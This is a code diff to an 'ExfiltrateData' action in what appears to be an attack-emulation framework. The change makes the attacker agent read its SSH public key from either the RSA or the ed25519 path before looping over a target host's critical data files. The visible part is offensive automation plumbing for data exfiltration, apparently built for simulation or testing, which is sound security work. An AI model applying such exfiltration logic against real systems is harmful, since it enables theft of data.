@@ -94,17 +94,20 @@ class ExfiltrateData(HighLevelAction):
         low_level_action_orchestrator: LowLevelActionOrchestrator,
         context: HighLevelContext,
     ):
-        # Get SSH key of attacker agent
-        events = await low_level_action_orchestrator.run_action(
-            ReadFile(attacker_agent, "/root/.ssh/id_rsa.pub"), context
-        )
+        # Get SSH key of attacker agent — try rsa then ed25519
         ssh_key_data = None
-        for event in events:
-            if isinstance(event, FileContentsFound):
-                ssh_key_data = event.contents
+        for key_path in ["/root/.ssh/id_rsa.pub", "/root/.ssh/id_ed25519.pub"]:
+            events = await low_level_action_orchestrator.run_action(
+                ReadFile(attacker_agent, key_path), context
+            )
+            for event in events:
+                if isinstance(event, FileContentsFound) and event.contents:
+                    ssh_key_data = event.contents
+                    break
+            if ssh_key_data:
                 break
 
-        if ssh_key_data is None:
+        if not ssh_key_data:
             raise Exception("No attacker ssh key")
 
         for user, file_paths in self.target_host.critical_data_files.items():
